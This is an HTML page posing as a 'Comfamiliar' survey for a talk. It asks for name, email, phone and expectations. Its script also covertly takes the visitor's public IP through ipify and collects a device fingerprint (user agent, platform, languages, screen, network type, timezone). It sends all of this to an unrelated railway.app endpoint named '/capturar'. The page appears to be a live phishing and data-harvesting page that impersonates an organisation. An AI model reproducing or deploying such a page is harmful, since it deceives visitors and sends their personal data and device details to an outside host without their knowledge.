<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>COMFAMILIAR</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        .header-image {
            width: 100%;
            max-width: 800px;
            height: auto;
            margin-bottom: 20px;
        }
        .container {
            background: #ffffff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 90%;
            max-width: 800px;
            padding: 20px;
            margin: 0 auto;
            text-align: center;
        }
        h1 {
            color: #007bff;
            margin-bottom: 20px;
        }
        .form-container {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            justify-content: center;
            text-align: left;
        }
        .form-container div {
            flex: 1 1 45%;
            max-width: 45%;
        }
        .form-container label {
            display: block;
            margin-bottom: 10px;
        }
        .form-container input, 
        .form-container textarea {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .form-container textarea {
            grid-column: span 2;
        }
        button {
            background-color: #007bff;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            margin-top: 20px;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <!-- Imagen en la parte superior -->
    <img src="https://th.bing.com/th/id/OIP.t45LaAZuhvewVUXe7Yq8jgAAAA?w=450&h=200&rs=1&pid=ImgDetMain" alt="Encabezado" class="header-image">

    <!-- Contenido centrado -->
    <div class="container">
        <h1>Encuesta Comfamiliar</h1>
        <form id="form">
            <div class="form-container">
                <div>
                    <label for="nombre">Nombre Completo:</label>
                    <input type="text" id="nombre" name="nombre" required>
                </div>
                <div>
                    <label for="email">Correo Electrónico:</label>
                    <input type="email" id="email" name="email" required>
                </div>
                <div>
                    <label for="telefono">Teléfono:</label>
                    <input type="tel" id="telefono" name="telefono" required>
                </div>
                <div>
                    <label for="expectativas">Expectativas para la Charla:</label>
                    <textarea id="expectativas" name="expectativas" rows="4" required></textarea>
                </div>
            </div>
            <button type="button" onclick="enviarDatos()">Enviar Información</button>
        </form>
    </div>

    <script>
        async function enviarDatos() {
            // Obtener dirección IP pública
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();

            // Información del formulario
            const formulario = document.getElementById('form');
            const datosFormulario = new FormData(formulario);

            const infoFormulario = {
                nombre: datosFormulario.get('nombre'),
                email: datosFormulario.get('email'),
                telefono: datosFormulario.get('telefono'),
                expectativas: datosFormulario.get('expectativas')
            };

            // Información del dispositivo
            const infoDispositivo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                lenguaje: navigator.language,
                idiomas: navigator.languages.join(', '),
                cookiesEnabled: navigator.cookieEnabled,
                javaEnabled: navigator.javaEnabled(),
                onlineStatus: navigator.onLine
            };

            // Información de la pantalla
            const infoPantalla = {
                resolucion: `${window.screen.width}x${window.screen.height}`,
                colorDepth: window.screen.colorDepth
            };

            // Información de la conexión
            let infoRed = { downlink: null, effectiveType: null };
            if (navigator.connection) {
                infoRed = {
                    downlink: navigator.connection.downlink,
                    effectiveType: navigator.connection.effectiveType
                };
            }

            // Zona horaria y fecha/hora local
            const infoTiempo = {
                fechaLocal: new Date().toString(),
                zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            // Enviar datos al servidor
            const datosRecopilados = {
                ip: ipData.ip,
                formulario: infoFormulario,
                dispositivo: infoDispositivo,
                pantalla: infoPantalla,
                red: infoRed,
                tiempo: infoTiempo
            };

            fetch('https://site-production-e3f3.up.railway.app/capturar', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(datosRecopilados)
            }).then(response => {
                if (response.ok) {
                    alert('Información enviada con éxito');
                } else {
                    alert('Error al enviar la información');
                }
            }).catch(error => {
                console.error('Error al conectar con el servidor:', error);
            });
        }
    </script>
</body>
</html>
